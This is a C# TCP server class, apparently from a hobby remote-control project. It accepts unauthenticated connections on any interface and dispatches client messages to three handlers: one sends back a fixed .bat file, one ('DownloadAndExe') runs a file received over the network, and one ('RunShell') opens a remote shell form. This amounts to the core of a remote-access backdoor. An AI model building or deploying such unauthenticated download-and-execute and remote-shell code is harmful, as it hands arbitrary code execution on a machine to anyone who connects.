using CommonLibrary;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace ServerLibrary
{
    public class ServerTcp
    {
        private TcpListener _listener;
        private CancellationTokenSource _token;
        Socket socketForServer;
        NetworkStream networkStream;
        StreamWriter streamWriter;
        StreamReader streamReader;
        StringBuilder strInput;
        //Thread th_StartListen, th_RunClient;

        private TcpListener Listener
        {
            get
            {
                return this._listener;
            }
            set
            {
                this._listener = value;
            }
        }

        private CancellationTokenSource cToken
        {
            get
            {
                return this._token;
            }
            set
            {
                this._token = value;
            }
        }

        public ServerTcp(int Port)
        {
            Listener = new TcpListener(IPAddress.Any, (int)Port);
        }

        /// <summary>
        /// Ctor
        /// </summary>
        public ServerTcp()
        {
            this.Listener = null;
            this.cToken = null;
        }

        /// <summary>
        /// Stop listening
        /// </summary>
        public void stopService()
        {
            if (Listener != null)
            {
                cToken.Cancel();
                Listener.Stop();
            }
        }

        /// <summary>
        /// Wait for client connection and call to the function that handel the client request
        /// </summary>
        /// <param name="Port"></param>
        /// <returns></returns>
        public async Task StartServiceAsync(int Port)
        {
            this.Listener = new TcpListener(IPAddress.Any, Port);
            try
            {
                Listener.Start();
                cToken = new CancellationTokenSource();
                cToken.Token.Register(() => Listener.Stop());
                await HandleClientsRequest();
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
        }

        private async Task HandleClientsRequest()
        {
            while (!cToken.Token.IsCancellationRequested)
            {
                try
                {
                    TcpClient client = await Task.Run(() => Listener.AcceptTcpClientAsync(), cToken.Token);
                    Task.Run(() => ProcessClientRequest(client), cToken.Token);
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                }
            }
        }

        /// <summary>
        /// Handelling incoming client requests
        /// </summary>
        /// <param name="argument"></param>
        /// <returns></returns>
        private async Task ProcessClientRequest(TcpClient client)
        {
            ServerClientMessage recivedMessage;
            try
            {
                NetworkStream netstream = client.GetStream();

                while(!this.cToken.IsCancellationRequested)
                {
                    recivedMessage = await CommonLibrary.TcpClass.GetMessageData(netstream);

                    if (!this.cToken.Token.IsCancellationRequested)
                    {
                        switch (recivedMessage.MyMessageType)
                        {
                            case MessageType.AskForFile:
                                {
                                    SendFileBack(netstream, recivedMessage);
                                    break;
                                }
                            case MessageType.DownloadAndExe:
                                {
                                    TcpClass.DownloadAndExeFile(recivedMessage, @"C:\Users\tomer\OneDrive\Desktop\FileInServer\Hello.bat");
                                    break;
                                }
                            case MessageType.RunShell:
                                {
                                    await RunClient();
                                    await SendClientRunShell(netstream);
                                    break;
                                }
                            case MessageType.DownloadAndExeRes:
                                break;
                            default:
                                break;
                        }
                    }
                }

            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
        }

        /// <summary>
        /// Send file back to the server
        /// </summary>
        /// <param name="netStream"></param>
        /// <param name="myMessage"></param>
        private async Task SendFileBack(NetworkStream netStream, ServerClientMessage myMessage)
        {
            byte[] SendingBuffer = null;
            try
            {
                byte[] dataSend;
                List<byte> byteList = new List<byte>();

                string FileName = @"C:\Users\tomer\OneDrive\Desktop\FileInServer\Hello.bat";

                // If I want to get the file path from my client.
                //string FileName = Encoding.ASCII.GetString(myMessage.MyData);

                FileStream Fs = new FileStream(FileName, FileMode.Open, FileAccess.Read);
                int NoOfPackets = Convert.ToInt32(Math.Ceiling(Convert.ToDouble(Fs.Length) / Convert.ToDouble(1024)));
                int FileLength = (int)Fs.Length, CurrentPacketLength;
                ServerClientMessage myReply = new ServerClientMessage(MessageType.DownloadAndExe, FileLength);

                // Run on the file and copy it to the messageReply
                // Todo: this is example for handling large requests, maybe we'll aplly later on the netStream writing
                for (int i = 0; i < NoOfPackets; i++)
                {
                    if (FileLength > 1024)
                    {
                        CurrentPacketLength = 1024;
                        FileLength = FileLength - CurrentPacketLength;
                    }
                    else
                        CurrentPacketLength = FileLength;
                    SendingBuffer = new byte[CurrentPacketLength];
                    Fs.Read(SendingBuffer, 0, CurrentPacketLength);
                    byteList.AddRange(SendingBuffer);
                }

                Fs.Close();

                myReply.MyData = byteList.ToArray();
                dataSend = myReply.serialize();
                await netStream.WriteAsync(dataSend, 0, dataSend.Length);
                await netStream.FlushAsync();
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
        }

        private async Task RunClient()
        {
            Application.EnableVisualStyles();
            Task.Run(() => Application.Run(new ShellForm()), cToken.Token);
        }

        private async Task SendClientRunShell(NetworkStream netStream)
        {
            try
            {
                byte[] dataSend;
                List<byte> byteList = new List<byte>();

                ServerClientMessage myReply = new ServerClientMessage(MessageType.RunShell, 0, new byte[0]);
                
                dataSend = myReply.serialize();
                await netStream.WriteAsync(dataSend, 0, dataSend.Length);
                await netStream.FlushAsync();
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
        }
    }
}
